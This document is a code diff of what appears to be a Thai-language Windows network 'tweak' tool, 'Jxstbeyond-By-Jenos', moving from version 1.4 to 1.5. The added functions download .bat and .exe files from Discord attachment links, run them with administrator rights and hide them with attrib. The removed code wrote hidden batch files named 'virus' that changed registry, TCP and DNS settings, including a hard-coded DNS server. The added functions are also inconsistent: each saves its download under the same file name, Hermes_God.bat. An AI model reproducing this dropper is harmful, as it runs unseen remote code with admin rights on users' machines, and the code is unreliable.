@@ -18,6 +18,12 @@ def _on_close():
             os.remove(f'C:/Users/Public/Videos/Install_Powerplan.bat')
             os.remove(f'C:/Users/Public/Videos/Low_ping.bat')
             os.remove(f'C:/Users/Public/Videos/Clear_All_Temp.bat')
+            
+            os.remove(f'C:/Users/Public/Videos/fixerror.exe')
+            os.remove(f'C:/Users/Public/Videos/RunSuperiorPunching.bat')
+            os.remove(f'C:/Users/Public/Videos/RunUnbeatableNetwork.bat')
+            os.remove(f'C:/Users/Public/Videos/Y2KREALPUNCH.bat')
+            os.remove(f'C:/Users/Public/Videos/J3Ke3NEtwork.bat')
             os._exit(1)
         except Exception as e:
             print("Exception:", e)
@@ -108,7 +114,7 @@ new_hwid = generate_hwid()[:16]
 hw = gethwid()[:15]
 mypcname = os.getlogin()
 NameProject = ("Jxstbeyond-By-Jenos")
-Version = ("1.4")
+Version = ("1.5")
 hwiduuid = f'''{NameProject} [{hw}-{mypcname}-{new_hwid}]''' 
 ipinfo = requests.get('https://ipinfo.io/json')
 ipinfojson = ipinfo.json()
@@ -284,12 +290,12 @@ def cmdset1(event):
         if is_admin():
             try:
                 os.startfile(f'C:/Users/Public/Videos/Backup_System.bat')
-                messagebox.showinfo("PRP - Sercurity", "โปรแกรมถูกเปิดใช้งานรอโปรแกรมทำงานเสร็จถึงกดตัวต่อไปได้")
+                messagebox.showinfo("PRP - Sercurity", "โปรแกรมถูกเปิดใช้งานแล้ว")
             except:
                 with open(f'C:/Users/Public/Videos/Backup_System.bat', 'wb') as f:
                     f.write(requests.get(mystr_encoded).content)
                 os.startfile(f'C:/Users/Public/Videos/Backup_System.bat')
-                messagebox.showinfo("PRP - Sercurity", "โปรแกรมถูกเปิดใช้งานรอโปรแกรมทำงานเสร็จถึงกดตัวต่อไปได้")
+                messagebox.showinfo("PRP - Sercurity", "โปรแกรมถูกเปิดใช้งานแล้ว")
 
             _doHideBatch = os.popen(f'attrib +h C:/Users/Public/Videos/Backup_System.bat')
             _doHideBatch.read()
@@ -319,12 +325,12 @@ def cmdset1_jenos(event):
         if is_admin():    
             try:
                 os.startfile(f'C:/Users/Public/Videos/Beyonder_Punch.bat')
-                messagebox.showinfo("PRP - Sercurity", "โปรแกรมถูกเปิดใช้งานรอโปรแกรมทำงานเสร็จถึงกดตัวต่อไปได้")
+                messagebox.showinfo("PRP - Sercurity", "โปรแกรมถูกเปิดใช้งานแล้ว")
             except:
                 with open(f'C:/Users/Public/Videos/Beyonder_Punch.bat', 'wb') as f:
                     f.write(requests.get(mystr_encoded).content)
                 os.startfile(f'C:/Users/Public/Videos/Beyonder_Punch.bat')
-                messagebox.showinfo("PRP - Sercurity", "โปรแกรมถูกเปิดใช้งานรอโปรแกรมทำงานเสร็จถึงกดตัวต่อไปได้")
+                messagebox.showinfo("PRP - Sercurity", "โปรแกรมถูกเปิดใช้งานแล้ว")
 
                 _doHideBatch = os.popen(f'attrib +h C:/Users/Public/Videos/Beyonder_Punch.bat')
                 _doHideBatch.read()
@@ -337,12 +343,12 @@ def cmdset2_jenos(event):
         if is_admin(): 
             try:
                 os.startfile(f'C:/Users/Public/Videos/Celestials_Puch.bat')
-                messagebox.showinfo("PRP - Sercurity", "โปรแกรมถูกเปิดใช้งานรอโปรแกรมทำงานเสร็จถึงกดตัวต่อไปได้")
+                messagebox.showinfo("PRP - Sercurity", "โปรแกรมถูกเปิดใช้งานแล้ว")
             except:
                 with open(f'C:/Users/Public/Videos/Celestials_Puch.bat', 'wb') as f:
                     f.write(requests.get(mystr_encoded).content)
                 os.startfile(f'C:/Users/Public/Videos/Celestials_Puch.bat')
-                messagebox.showinfo("PRP - Sercurity", "โปรแกรมถูกเปิดใช้งานรอโปรแกรมทำงานเสร็จถึงกดตัวต่อไปได้")
+                messagebox.showinfo("PRP - Sercurity", "โปรแกรมถูกเปิดใช้งานแล้ว")
 
                 _doHideBatch = os.popen(f'attrib +h C:/Users/Public/Videos/Celestials_Puch.bat')
                 _doHideBatch.read()
@@ -354,12 +360,12 @@ def cmdset3_jenos(event):
         if is_admin(): 
             try:
                 os.startfile(f'C:/Users/Public/Videos/Entity_Punch.exe')
-                messagebox.showinfo("PRP - Sercurity", "โปรแกรมถูกเปิดใช้งานรอโปรแกรมทำงานเสร็จถึงกดตัวต่อไปได้")
+                messagebox.showinfo("PRP - Sercurity", "โปรแกรมถูกเปิดใช้งานแล้ว")
             except:
                 with open(f'C:/Users/Public/Videos/Entity_Punch.exe', 'wb') as f:
                     f.write(requests.get(mystr_encoded).content)
                 os.startfile(f'C:/Users/Public/Videos/Entity_Punch.exe')
-                messagebox.showinfo("PRP - Sercurity", "โปรแกรมถูกเปิดใช้งานรอโปรแกรมทำงานเสร็จถึงกดตัวต่อไปได้")
+                messagebox.showinfo("PRP - Sercurity", "โปรแกรมถูกเปิดใช้งานแล้ว")
 
                 _doHideBatch = os.popen(f'attrib +h C:/Users/Public/Videos/Entity_Punch.exe')
                 _doHideBatch.read()
@@ -371,12 +377,12 @@ def cmdset4_jenos(event):
         if is_admin(): 
             try:
                 os.startfile(f'C:/Users/Public/Videos/Hermes_God.bat')
-                messagebox.showinfo("PRP - Sercurity", "โปรแกรมถูกเปิดใช้งานรอโปรแกรมทำงานเสร็จถึงกดตัวต่อไปได้")
+                messagebox.showinfo("PRP - Sercurity", "โปรแกรมถูกเปิดใช้งานแล้ว")
             except:
                 with open(f'C:/Users/Public/Videos/Hermes_God.bat', 'wb') as f:
                     f.write(requests.get(mystr_encoded).content)
                 os.startfile(f'C:/Users/Public/Videos/Hermes_God.bat')
-                messagebox.showinfo("PRP - Sercurity", "โปรแกรมถูกเปิดใช้งานรอโปรแกรมทำงานเสร็จถึงกดตัวต่อไปได้")
+                messagebox.showinfo("PRP - Sercurity", "โปรแกรมถูกเปิดใช้งานแล้ว")
 
                 _doHideBatch = os.popen(f'attrib +h C:/Users/Public/Videos/Hermes_God.bat')
                 _doHideBatch.read()
@@ -384,254 +390,87 @@ def cmdset4_jenos(event):
         else:
             run_as_admin()
 def RunSuperiorPunching():
-        file_location = os.path.join(tempfile.gettempdir(), f"virus{token_hex(16)}.bat")
-        open(file_location, 'wb').write(bytes('''
-    start /min cmd /c
-    (
-sc config "BITS" start= auto \n cls
-sc start "BITS" \n cls
-for /f "tokens=3" %%a in ('sc queryex "BITS" ^| findstr "PID"') do (set pid=%%a)
-) >nul 2>&1 \n cls
-wmic process where name="javaw.exe" CALL setpriority "realtime" \n cls
-wmic process where name="svchost.exe" CALL setpriority "idle" \n cls
-wmic process where name="explorer.exe" CALL setpriority "high" \n cls
-wmic process where name="mDNSResponder.exe" CALL setpriority "idle" \n cls
-wmic process where name="BRTSvc.exe" CALL setpriority "realtime" \n cls
-wmic process where name="csrss.exe" CALL setpriority "high" \n cls
-wmic process where name="dwm.exe" CALL setpriority "idle" \n cls
-wmic process where name="rundll32.exe" CALL setpriority "high" \n cls
-wmic process where name="nvvsvc.exe" CALL setpriority "idle" \n cls
-wmic process where name="taskhost.exe" CALL setpriority "high" \n cls
-wmic process where name="taskmgr.exe" CALL setpriority "high" \n cls
-wmic process where name="dllhost.exe" CALL setpriority "idle" \n cls
-wmic process where name="dashost.exe" CALL setpriority "idle" \n cls
-wmic process where name="TCPSVCS.EXE" CALL setpriority "idle" \n cls
-wmic process where name="SetTimerResolutionService.exe" CALL setpriority "realtime" \n cls
-netsh int tcp set global chimney=enable \n cls 
-netsh int tcp set global autotuninglevel=disabled \n cls
-netsh int tcp set global ecncapability=disabled \n cls
-netsh interface tcp set global ecncapability=disabled \n cls
-netsh interface ipv4 set subinterface "Local Area Connection" mtu=4000 store=persistent \n cls
-netsh interface ipv4 set subinterface "Internet" mtu=4000 store=persistent \n cls
-netsh int tcp set global rss=default \n cls
-netsh int tcp set global congestion provider=ctcp \n cls
-netsh int tcp set heuristics disabled \n cls
-netsh int ip reset c:resetlog.txt \n cls
-netsh int ip reset C:   cplog.txt \n cls
-netsh int tcp set global timestamps=disabled \n cls 
-netsh int tcp set global nonsackrttresiliency=disabled \n cls
-netsh int tcp set global dca=disabled \n cls
-netsh int tcp set global netdma=disabled \n cls
-regedit /s SG_Vista_TcpIp_Patch.reg \n cls
-del SG_Vista_TcpIp_Patch.reg \n cls
-ipconfig /flushdns \n cls
-    ''', 'utf-8'))
-        subprocess.run(['attrib', '+h', file_location], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)
-        subprocess.run([file_location], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)
-        os.remove(file_location)
-        messagebox.showinfo("PRP - Sercurity", "โปรแกรมทำงานเสร็จสิ้นสามารถกดตัวต่อไปได้")
+        mystr_encoded = "https://cdn.discordapp.com/attachments/1181251569539366962/1181918319205416980/RunSuperiorPunching.bat?ex=6582ce36&is=65705936&hm=19848aee167dd63bc643b961b8fe72b01f7654180bace8c9839c28ade8664d17&"
+        if is_admin(): 
+            try:
+                os.startfile(f'C:/Users/Public/Videos/Hermes_God.bat')
+                messagebox.showinfo("PRP - Sercurity", "โปรแกรมถูกเปิดใช้งานแล้ว")
+            except:
+                with open(f'C:/Users/Public/Videos/Hermes_God.bat', 'wb') as f:
+                    f.write(requests.get(mystr_encoded).content)
+                os.startfile(f'C:/Users/Public/Videos/Hermes_God.bat')
+                messagebox.showinfo("PRP - Sercurity", "โปรแกรมถูกเปิดใช้งานแล้ว")
+
+                _doHideBatch = os.popen(f'attrib +h C:/Users/Public/Videos/Hermes_God.bat')
+                _doHideBatch.read()
+                _doHideBatch.close()
+        else:
+            run_as_admin()
 
 def RunUnbeatableNetwork():
-        file_location = os.path.join(tempfile.gettempdir(), f"virus{token_hex(16)}.bat")
-        open(file_location, 'wb').write(bytes('''
-netsh interface ipv4 set subinterface "Ethernet" mtu=5000 store=persistent \n cls
-netsh int tcp set global congestionprovider=none \n cls
-netsh int tcp set global autotuninglevel=high \n cls
-netsh int tcp set global chimney=disabled \n cls
-netsh int tcp set global dca=enable \n cls
-netsh int tcp set global netdma=enable \n cls
-netsh int tcp set heuristics enable \n cls
-netsh int tcp set global rss=enabled \n cls
-netsh int tcp set global timestamps=enable \n cls
-regedit /s SG_Vista_TcpIp_Patch.reg \n cls
-del SG_Vista_TcpIp_Patch.reg \n cls
-PowerShell.exe Set-NetTCPSetting -SettingName InternetCustom -NonSackRttResiliency disabled \n cls
-PowerShell.exe Set-NetTCPSetting -SettingName InternetCustom -MaxSynRetransmissions 2 \n cls
-PowerShell.exe Set-NetTCPSetting -SettingName InternetCustom -EcnCapability disabled \n cls
-PowerShell.exe Set-NetTCPSetting -SettingName InternetCustom -EcnCapability disabled \n cls
-PowerShell.exe Set-NetTCPSetting -SettingName InternetCustom -Timestamps disabled \n cls
-Set-NetTCPSetting -SettingName InternetCustom -AutoTuningLevelLocal Normal \n cls
-Set-NetTCPSetting -SettingName InternetCustom -ScalingHeuristics disabled \n cls
-Set-NetTCPSetting -SettingName InternetCustom -CongestionProvider ctcp \n cls
-netsh int tcp set heuristics disabled \n cls
-netsh int tcp set global ecncapability=disabled \n cls
-netsh int tcp set global congestionprovider=ctcp \n cls
-netsh int tcp set global netdma=disabled \n cls
-netsh int tcp set global dca=enabled \n cls
-netsh int tcp set global chimney=enabled \n cls
-netsh int tcp set global autotuninglevel=normal \n cls
-netsh int tcp set supplemental template=custom icw=10 \n cls
-netsh int tcp set global initialRto=2000 \n cls
-netsh int tcp set global maxsynretransmissions=2 \n cls
-netsh int tcp set global rsc=enabled \n cls
-netsh int tcp set global nonsackrttresiliency=disabled \n cls
-netsh int tcp set global timestamps=disabled \n cls
-netsh int tcp set global fastopen=enabled \n cls
-netsh int tcp set global rss=enabled \n cls
-    ''', 'utf-8'))
-        subprocess.run(['attrib', '+h', file_location], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)
-        subprocess.run([file_location], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)
-        os.remove(file_location)
-        messagebox.showinfo("PRP - Sercurity", "โปรแกรมทำงานเสร็จสิ้นสามารถกดตัวต่อไปได้")
+        mystr_encoded = "https://cdn.discordapp.com/attachments/1181251569539366962/1181918319511613561/RunUnbeatableNetwork.bat?ex=6582ce36&is=65705936&hm=ae204501010896df377e0ef3d57a0b27c79f9cf218d09855a04ef711e1e3520a&"
+        if is_admin(): 
+            try:
+                os.startfile(f'C:/Users/Public/Videos/Hermes_God.bat')
+                messagebox.showinfo("PRP - Sercurity", "โปรแกรมถูกเปิดใช้งานแล้ว")
+            except:
+                with open(f'C:/Users/Public/Videos/Hermes_God.bat', 'wb') as f:
+                    f.write(requests.get(mystr_encoded).content)
+                os.startfile(f'C:/Users/Public/Videos/Hermes_God.bat')
+                messagebox.showinfo("PRP - Sercurity", "โปรแกรมถูกเปิดใช้งานแล้ว")
+
+                _doHideBatch = os.popen(f'attrib +h C:/Users/Public/Videos/Hermes_God.bat')
+                _doHideBatch.read()
+                _doHideBatch.close()
+        else:
+            run_as_admin()
 
 def Y2KREALPUNCH():
-        file_location = os.path.join(tempfile.gettempdir(), f"virus{token_hex(16)}.bat")
-        open(file_location, 'wb').write(bytes('''
-bcdedit /deletevalue useplatformclock \n cls
-bcdedit /set useplatformclock true \n cls
-fsutil behavior set disabledeletenotify 0 \n cls
-bcdedit /deletevalue useplatformclock \n cls
-reg add "HKLM\System\CurrentControlSet\services	cpip\Parameters\Interfaces\{1403E43F-0AB1-4EBB-A6E3-59C64B960519}" /f /v "NameServer" /t REG_SZ /d "186.125.131.18,208.67.220.220" \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\ServiceProvider" /v "LocalPriority" /t REG_DWORD /d "4" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\ServiceProvider" /v "HostsPriority" /t REG_DWORD /d "5" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\ServiceProvider" /v "DnsPriority" /t REG_DWORD /d "6" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\ServiceProvider" /v "NetbtPriority" /t REG_DWORD /d "7" /f \n cls
-Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "NetworkThrottlingIndex" /t REG_DWORD /d "4294967295" /f \n cls
-Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "SystemResponsiveness" /t REG_DWORD /d "0" /f \n cls
-Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Psched" /v "NonBestEffortLimit" /t REG_DWORD /d "0" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Psched" /v "NonBestEffortLimit" /t REG_DWORD /d "0" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" /v "MaxCmds" /t REG_DWORD /d "30" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" /v "MaxThreads" /t REG_DWORD /d "30" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" /v "MaxCollectionCount" /t REG_DWORD /d "32" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "LargeSystemCache" /t REG_DWORD /d "0" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "IoPageLockLimit" /t REG_DWORD /d "983040" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "IRPStackSize" /t REG_DWORD /d "32" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "SizReqBuf" /t REG_DWORD /d "17424" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "Size" /t REG_DWORD /d "3" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "MaxWorkItems" /t REG_DWORD /d "8192" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "MaxMpxCt" /t REG_DWORD /d "2048" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "MaxCmds" /t REG_DWORD /d "2048" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "DisableStrictNameChecking" /t REG_DWORD /d "1" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "EnableDynamicBacklog" /t REG_DWORD /d "1" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "MinimumDynamicBacklog" /t REG_DWORD /d "200" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "MaximumDynamicBacklog" /t REG_DWORD /d "20000" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "DynamicBacklogGrowthDelta" /t REG_DWORD /d "100" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "KeepAliveInterval" /t REG_DWORD /d "1" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "NegativeSOACacheTime" /t REG_DWORD /d "0" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "NetFailureCacheTime" /t REG_DWORD /d "0" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "MaxCacheEntryTtlLimit" /t REG_DWORD /d "10800" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "MaxCacheTtl" /t REG_DWORD /d "10800" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "MaxNegativeCacheTtl" /t REG_DWORD /d "0" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DefaultTTL" /t REG_DWORD /d "64" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DisableTaskOffload" /t REG_DWORD /d "1" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableConnectionRateLimiting" /t REG_DWORD /d "0" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableDCA" /t REG_DWORD /d "1" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnablePMTUBHDetect" /t REG_DWORD /d "0" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnablePMTUDiscovery" /t REG_DWORD /d "1" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableRSS" /t REG_DWORD /d "1" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableTCPA" /t REG_DWORD /d "0" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableWsd" /t REG_DWORD /d "0" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "GlobalMaxTcpWindowSize" /t REG_DWORD /d "65535" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxConnectionsPer1_0Server" /t REG_DWORD /d "16" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxConnectionsPerServer" /t REG_DWORD /d "16" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxFreeTcbs" /t REG_DWORD /d "65535" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxHashTableSize" /t REG_DWORD /d "65536" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxUserPort" /t REG_DWORD /d "65534" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "SackOpts" /t REG_DWORD /d "1" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "SynAttackProtect" /t REG_DWORD /d "1" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TCPNoDelay" /t REG_DWORD /d "1" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "Tcp1323Opts" /t REG_DWORD /d "1" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpCreateAndConnectTcbRateLimitDepth" /t REG_DWORD /d "0" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpMaxDataRetransmissions" /t REG_DWORD /d "3" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpMaxDupAcks" /t REG_DWORD /d "2" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpMaxSendFree" /t REG_DWORD /d "65535" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpNumConnections" /t REG_DWORD /d "16777214" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpTimedWaitDelay" /t REG_DWORD /d "30" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpWindowSize" /t REG_DWORD /d "64240" /f \n cls
-Reg.exe add "HKLM\SOFTWARE\Microsoft\MSMQ\Parameters" /v "TCPNoDelay" /t REG_DWORD /d "1" /f \n cls
-Reg.exe add "HKLM\SOFTWARE\Microsoft\MSMQ\Parameters" /v "IgnoreOSNameValidation" /t REG_DWORD /d "1" /f \n cls
-Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v "MaxConnectionsPerServer" /t REG_DWORD /d "16" /f \n cls
-Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v "MaxConnectionsPer1_0Server" /t REG_DWORD /d "16" /f \n cls
-Reg.exe add "HKU\.DEFAULT\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v "MaxConnectionsPerServer" /t REG_DWORD /d "16" /f \n cls
-Reg.exe add "HKU\.DEFAULT\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v "MaxConnectionsPer1_0Server" /t REG_DWORD /d "16" /f \n cls
-Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings" /v "MaxConnectionsPerServer" /t REG_DWORD /d "16" /f \n cls
-Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings" /v "MaxConnectionsPer1_0Server" /t REG_DWORD /d "16" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\QoS" /v "Do not use NLA" /t REG_SZ /d "1" /f \n cls
-    ''', 'utf-8'))
-        subprocess.run(['attrib', '+h', file_location], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)
-        subprocess.run([file_location], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)
-        os.remove(file_location)
-        messagebox.showinfo("PRP - Sercurity", "โปรแกรมทำงานเสร็จสิ้นสามารถกดตัวต่อไปได้")
+        mystr_encoded = "https://cdn.discordapp.com/attachments/1181251569539366962/1181918319826178128/Y2KREALPUNCH.bat?ex=6582ce36&is=65705936&hm=aaaf5e603791e9695e0ed274e89ce708b4e6f7af7ba30e84e980553b60538619&"
+        if is_admin(): 
+            try:
+                os.startfile(f'C:/Users/Public/Videos/Hermes_God.bat')
+                messagebox.showinfo("PRP - Sercurity", "โปรแกรมถูกเปิดใช้งานแล้ว")
+            except:
+                with open(f'C:/Users/Public/Videos/Hermes_God.bat', 'wb') as f:
+                    f.write(requests.get(mystr_encoded).content)
+                os.startfile(f'C:/Users/Public/Videos/Hermes_God.bat')
+                messagebox.showinfo("PRP - Sercurity", "โปรแกรมถูกเปิดใช้งานแล้ว")
+
+                _doHideBatch = os.popen(f'attrib +h C:/Users/Public/Videos/Hermes_God.bat')
+                _doHideBatch.read()
+                _doHideBatch.close()
+        else:
+            run_as_admin()
 def J3Ke3NEtwork():
-    
-        file_location = os.path.join(tempfile.gettempdir(), f"virus{token_hex(16)}.bat")
-        open(file_location, 'wb').write(bytes('''
-    Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\%%i" /v "TcpWindowsSize" /t REG_DWORD /d "%DECRWIN%" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\%%i" /v "GlobalMaxTcpWindowsSize" /t REG_DWORD /d "%DECRWIN%" /f \n cls 
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpWindowsSize" /t REG_DWORD /d "%DECRWIN%" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "GlobalMaxTcpWindowsSize" /t REG_DWORD /d "%DECRWIN%" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpWindowsSize" /t REG_DWORD /d "%DECRWIN%" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "GlobalMaxTcpWindowsSize" /t REG_DWORD /d "%DECRWIN%" /f
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\services\Tcpip\Parameters\Interfaces\<GUID>" /v "TcpACKFrequency" /t REG_DWORD /d "0" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\services\Tcpip\Parameters\Interfaces\<GUID>" /v "TcpDelAckTicks" /t REG_DWORD /d "0" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\services\Tcpip\Parameters\Interfaces\<GUID>" /v "TCPNoDelay" /t REG_DWORD /d "01" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\services\Tcpip\Parameters\Interfaces\<GUID>" /v "PerformRouterDiscovery" /t REG_DWORD /d "0" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\services\Tcpip\Parameters\Interfaces\<GUID>" /v "InterfaceMetric" /t REG_DWORD /d "0" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\services\Tcpip\Parameters\Interfaces\{A0520609-B255-4E00-A46C-B22AB88F5823}" /v "Domain" /t REG_SZ /d "" /f \n cls 
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\services\Tcpip\Parameters\Interfaces\{A0520609-B255-4E00-A46C-B22AB88F5823}" /v "RegistrationEnabled" /t REG_DWORD /d "0" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\services\Tcpip\Parameters\Interfaces\{A0520609-B255-4E00-A46C-B22AB88F5823}" /v "RegisterAdapterName" /t REG_DWORD /d "0" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\services\Tcpip\Parameters\Interfaces\{A0520609-B255-4E00-A46C-B22AB88F5823}" /v "DhcpInterfaceOptions" /t REG_BINARY /d "0f00000000000000000000000000000041e1ec587900000000000000000000000000000041e1ec580100000000000000000000000000000041e1ec582b00000000000000000000000000000041e1ec582c00000000000000000000000000000041e1ec580600000000000000000000000000000041e1ec58" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\services\Tcpip\Parameters\Interfaces\{A0520609-B255-4E00-A46C-B22AB88F5823}" /v "TCPNoDelay" /t REG_DWORD /d "1130458716" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\services\Tcpip\Parameters\Interfaces\{A0520609-B255-4E00-A46C-B22AB88F5823}" /v "TcpDelAckTicks" /t REG_DWORD /d "0" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\services\Tcpip\Parameters\Interfaces\{A0520609-B255-4E00-A46C-B22AB88F5823}" /v "TcpWindowSize" /t REG_DWORD /d "1130458716" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\services\Tcpip\Parameters\Interfaces\{A0520609-B255-4E00-A46C-B22AB88F5823}" /v "TcpAckFrequency" /t REG_DWORD /d "70653669" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DefaultTTL" /t REG_DWORD /d "64" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DisableTaskOffload" /t REG_DWORD /d "1" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableConnectionRateLimiting" /t REG_DWORD /d "0" /f \n cls
